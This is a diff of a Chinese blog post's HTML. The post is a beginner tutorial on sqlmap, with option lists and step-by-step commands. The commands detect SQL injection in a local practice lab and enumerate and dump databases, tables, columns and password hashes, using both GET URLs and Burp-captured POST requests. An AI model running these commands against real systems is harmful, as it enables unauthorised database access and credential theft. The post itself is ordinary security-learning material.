@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1k 字
+      955 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      11
        分钟
     </span>
   
@@ -227,8 +227,10 @@
             <h1 style="display: none">sqlmap</h1>
             
             <div class="markdown-body">
-              <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>sqlmap终于终于搭好了，之前的python环境没搭好，下了好多次换过2.X和3.X，设置环境变量的时候还不小心将path变量删了导致博客崩了……之后sqlmap解压错根目录了…终于把sqlmap搭好了想打靶场，发现还需要有抓包工具，于是又去搭java环境,下Burp Suite。现在终于可以了!!!</p>
-<h1 id="Sqlmap简介"><a href="#Sqlmap简介" class="headerlink" title="Sqlmap简介"></a>Sqlmap简介</h1><p>五种注入模式：布尔盲注，时间盲注，报错注入，联合查询，堆查询</p>
+              <h4 id="前言"><a class="header-anchor" href="#前言">🍭</a>前言</h4>
+<p>sqlmap终于终于搭好了，之前的python环境没搭好，下了好多次换过2.X和3.X，设置环境变量的时候还不小心将path变量删了导致博客崩了…之后sqlmap解压错根目录了…终于把sqlmap搭好了想打靶场，发现还需要有抓包工具，于是又去搭java环境,下Burp Suite。现在终于可以了!!!</p>
+<h1>Sqlmap简介</h1>
+<p>五种注入模式：布尔盲注，时间盲注，报错注入，联合查询，堆查询</p>
 <p>支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
 <p>七种等级:</p>
 <ul>
@@ -241,42 +243,106 @@
 <li>6 同时显示HTTP响应页面。</li>
 </ul>
 <p>常用命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">-a, --all&#x2F;&#x2F;获取所有信息</span><br><span class="line"></span><br><span class="line">-b, --banner&#x2F;&#x2F;获取数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user&#x2F;&#x2F;获取数据库管理系统当前用户</span><br><span class="line"></span><br><span class="line">--current-db&#x2F;&#x2F;获取数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">--hostname&#x2F;&#x2F;获取数据库服务器的主机名称</span><br><span class="line"></span><br><span class="line">--is-dba&#x2F;&#x2F;检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users&#x2F;&#x2F;枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords&#x2F;&#x2F;枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges&#x2F;&#x2F;枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles&#x2F;&#x2F;枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs&#x2F;&#x2F;枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables&#x2F;&#x2F;枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns&#x2F;&#x2F;枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--schema&#x2F;&#x2F;枚举数据库架构</span><br><span class="line"></span><br><span class="line">--count&#x2F;&#x2F;检索表的项目数，获取表中的数据个数:sqlmap.py -u url --count -D testdb</span><br><span class="line"></span><br><span class="line">--dump&#x2F;&#x2F;转储数据库表项</span><br><span class="line"></span><br><span class="line">--dump-all&#x2F;&#x2F;转储数据库所有表项</span><br><span class="line"></span><br><span class="line">--search&#x2F;&#x2F;搜索列（S），表（S）和&#x2F;或数据库名称（S）</span><br><span class="line"></span><br><span class="line">--comments&#x2F;&#x2F;获取DBMS注释</span><br><span class="line"></span><br><span class="line">-D DB&#x2F;&#x2F;要进行枚举的指定数据库名</span><br><span class="line"></span><br><span class="line">-T TBL&#x2F;&#x2F;DBMS数据库表枚举</span><br><span class="line"></span><br><span class="line">-C COL&#x2F;&#x2F;DBMS数据库表列枚举</span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL&#x2F;&#x2F;DBMS数据库表不进行枚举</span><br><span class="line"></span><br><span class="line">-U USER&#x2F;&#x2F;用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs&#x2F;&#x2F;枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--start&#x3D;LIMITSTART&#x2F;&#x2F;获取第一个查询输出数据位置</span><br><span class="line"></span><br><span class="line">--stop&#x3D;LIMITSTOP&#x2F;&#x2F;获取最后查询的输出数据</span><br><span class="line"></span><br><span class="line">--first&#x3D;FIRSTCHAR&#x2F;&#x2F;第一个查询输出字的字符获取</span><br><span class="line"></span><br><span class="line">--last&#x3D;LASTCHAR&#x2F;&#x2F;最后查询的输出字字符获取</span><br><span class="line"></span><br><span class="line">--sql-query&#x3D;QUERY&#x2F;&#x2F;要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell&#x2F;&#x2F;提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line">--sql-file&#x3D;SQLFILE&#x2F;&#x2F;要执行的SQL文件</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs awk">-a, --all<span class="hljs-regexp">//</span>获取所有信息
 
+-b, --banner<span class="hljs-regexp">//</span>获取数据库管理系统的标识
+
+--current-user<span class="hljs-regexp">//</span>获取数据库管理系统当前用户
+
+--current-db<span class="hljs-regexp">//</span>获取数据库管理系统当前数据库
+
+--hostname<span class="hljs-regexp">//</span>获取数据库服务器的主机名称
+
+--is-dba<span class="hljs-regexp">//</span>检测DBMS当前用户是否DBA
+
+--users<span class="hljs-regexp">//</span>枚举数据库管理系统用户
+
+--passwords<span class="hljs-regexp">//</span>枚举数据库管理系统用户密码哈希
+
+--privileges<span class="hljs-regexp">//</span>枚举数据库管理系统用户的权限
+
+--roles<span class="hljs-regexp">//</span>枚举数据库管理系统用户的角色
+
+--dbs<span class="hljs-regexp">//</span>枚举数据库管理系统数据库
+
+--tables<span class="hljs-regexp">//</span>枚举的DBMS数据库中的表
+
+--columns<span class="hljs-regexp">//</span>枚举DBMS数据库表列
+
+--schema<span class="hljs-regexp">//</span>枚举数据库架构
+
+--count<span class="hljs-regexp">//</span>检索表的项目数，获取表中的数据个数:sqlmap.py -u url --count -D testdb
+
+--dump<span class="hljs-regexp">//</span>转储数据库表项
+
+--dump-all<span class="hljs-regexp">//</span>转储数据库所有表项
+
+--search<span class="hljs-regexp">//</span>搜索列（S），表（S）和/或数据库名称（S）
+
+--comments<span class="hljs-regexp">//</span>获取DBMS注释
+
+-D DB<span class="hljs-regexp">//</span>要进行枚举的指定数据库名
+
+-T TBL<span class="hljs-regexp">//</span>DBMS数据库表枚举
+
+-C COL<span class="hljs-regexp">//</span>DBMS数据库表列枚举
+
+-X EXCLUDECOL<span class="hljs-regexp">//</span>DBMS数据库表不进行枚举
+
+-U USER<span class="hljs-regexp">//</span>用来进行枚举的数据库用户
+
+--exclude-sysdbs<span class="hljs-regexp">//</span>枚举表时排除系统数据库
+
+--start=LIMITSTART<span class="hljs-regexp">//</span>获取第一个查询输出数据位置
+
+--stop=LIMITSTOP<span class="hljs-regexp">//</span>获取最后查询的输出数据
+
+--first=FIRSTCHAR<span class="hljs-regexp">//</span>第一个查询输出字的字符获取
+
+--last=LASTCHAR<span class="hljs-regexp">//</span>最后查询的输出字字符获取
+
+--sql-query=QUERY<span class="hljs-regexp">//</span>要执行的SQL语句
+
+--sql-shell<span class="hljs-regexp">//</span>提示交互式SQL的shell
+
+--sql-file=SQLFILE<span class="hljs-regexp">//</span>要执行的SQL文件</code></pre>
 <p>技术分类：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">–technique：</span><br><span class="line">B：布尔盲注</span><br><span class="line">E：报错</span><br><span class="line">U：联合</span><br><span class="line">S：堆叠</span><br><span class="line">T：时间</span><br><span class="line">Q：内联查询</span><br></pre></td></tr></table></figure>
-
-<h1 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h1><h4 id="1-先测试是否存在注入"><a href="#1-先测试是否存在注入" class="headerlink" title="1.先测试是否存在注入"></a>1.先测试是否存在注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="hljs excel">–technique：
+B：布尔盲注
+E：报错
+U：联合
+S：堆叠
+<span class="hljs-built_in">T</span>：时间
+Q：内联查询</code></pre>
+<h1>GET型</h1>
+<h4 id="1-先测试是否存在注入"><a class="header-anchor" href="#1-先测试是否存在注入">🍭</a>1.先测试是否存在注入</h4>
+<pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://localhost/Less-1/?id=1&quot;</span></code></pre>
 <p><img src="/2020/12/01/sqlmap/1.jpg" srcset="/img/loading.gif" alt="1"></p>
 <p>红框框中语句表明存在注入，有时候也可能不存在SQL注入。逐个测试会挺麻烦的可以批量检测，将目标url整理为txt文件，当文件保存为hhh.txt时使用“sqlmap.py-m hhh.txt”，注意<strong>hhh.txt跟sqlmap在同一个目录下</strong></p>
-<h4 id="2-查库"><a href="#2-查库" class="headerlink" title="2.查库"></a>2.查库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
-
+<h4 id="2-查库"><a class="header-anchor" href="#2-查库">🍭</a>2.查库</h4>
+<pre><code class="hljs jboss-cli">python sqlmap.py -u <span class="hljs-string">&quot;http://localhost/Less-1/?id=1&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span></code></pre>
 <p>or</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] --current-db&#x2F;&#x2F;列出当前数据库</span><br></pre></td></tr></table></figure>
-
+<pre><code class="hljs awk">sqlmap -u [“url”] --current-db<span class="hljs-regexp">//</span>列出当前数据库</code></pre>
 <p><code>dbs</code>表示列出说有数据库，batch可以自动选择，也可以省略，但省略后就需要手动选择<img src="/2020/12/01/sqlmap/2.jpg" srcset="/img/loading.gif" alt="2"></p>
-<h4 id="3-查表"><a href="#3-查表" class="headerlink" title="3.查表"></a>3.查表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] --tables --batch</span><br></pre></td></tr></table></figure>
-
+<h4 id="3-查表"><a class="header-anchor" href="#3-查表">🍭</a>3.查表</h4>
+<pre><code class="hljs brainfuck"><span class="hljs-comment">sqlmap</span> <span class="hljs-literal">-</span><span class="hljs-comment">u</span> <span class="hljs-title">[</span><span class="hljs-comment">“url”</span><span class="hljs-title">]</span> <span class="hljs-literal">-</span><span class="hljs-comment">D</span> <span class="hljs-title">[</span><span class="hljs-comment">‘数据库名’</span><span class="hljs-title">]</span> --<span class="hljs-comment">tables</span> --<span class="hljs-comment">batch</span></code></pre>
 <p><img src="/2020/12/01/sqlmap/3.jpg" srcset="/img/loading.gif" alt="3"></p>
-<h4 id="4-查列"><a href="#4-查列" class="headerlink" title="4.查列"></a>4.查列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns --batch</span><br></pre></td></tr></table></figure>
-
+<h4 id="4-查列"><a class="header-anchor" href="#4-查列">🍭</a>4.查列</h4>
+<pre><code class="hljs scss">sqlmap -u <span class="hljs-selector-attr">[“url”]</span> -D <span class="hljs-selector-attr">[‘数据库名’]</span> -T<span class="hljs-selector-attr">[‘表名’]</span> --<span class="hljs-attribute">columns</span> --batch</code></pre>
 <p><img src="/2020/12/01/sqlmap/4.jpg" srcset="/img/loading.gif" alt="4"></p>
-<h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump --batch</span><br></pre></td></tr></table></figure>
-
+<h4 id="5-爆值"><a class="header-anchor" href="#5-爆值">🍭</a>5.爆值</h4>
+<pre><code class="hljs css"><span class="hljs-selector-tag">sqlmap</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[“url”]</span> <span class="hljs-selector-tag">-D</span> <span class="hljs-selector-attr">[‘数据库名’]</span> <span class="hljs-selector-tag">-T</span> <span class="hljs-selector-attr">[‘表名’]</span> <span class="hljs-selector-tag">-C</span> <span class="hljs-selector-attr">[‘字段名1,字段名2,…’]</span> <span class="hljs-selector-tag">--dump</span> <span class="hljs-selector-tag">--batch</span></code></pre>
 <p><img src="/2020/12/01/sqlmap/5.jpg" srcset="/img/loading.gif" alt="5"></p>
 <p>关与关之间需要清除sqlmap缓存：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --purge</span><br></pre></td></tr></table></figure>
-
-<h1 id="Post型"><a href="#Post型" class="headerlink" title="Post型"></a>Post型</h1><p>先用burp suite抓个包，保存到文件里</p>
+<pre><code class="hljs c">python sqlmap.py --purge</code></pre>
+<h1>Post型</h1>
+<p>先用burp suite抓个包，保存到文件里</p>
 <p><img src="/2020/12/01/sqlmap/6.jpg" srcset="/img/loading.gif" alt="6"></p>
 <p>执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt&quot; --leve&#x3D;5 --risk&#x3D;3 --dbs</span><br></pre></td></tr></table></figure>
-
+<pre><code class="hljs routeros">sqlmap.py -r <span class="hljs-string">&quot;C:\Users\32270\Desktop\hhh.txt&quot;</span> <span class="hljs-attribute">--leve</span>=5 <span class="hljs-attribute">--risk</span>=3 --dbs</code></pre>
 <p><img src="/2020/12/01/sqlmap/7.jpg" srcset="/img/loading.gif" alt="7"></p>
 <p>查表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt &quot; -D security --tables --batch</span><br></pre></td></tr></table></figure>
-
+<pre><code class="hljs taggerscript">python sqlmap.py -r &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\3</span>2270<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\h</span>hh.txt &quot; -D security --tables --batch</code></pre>
 <p><img src="/2020/12/01/sqlmap/8.jpg" srcset="/img/loading.gif" alt="8"></p>
 <p>接下去跟get型一样。</p>
 
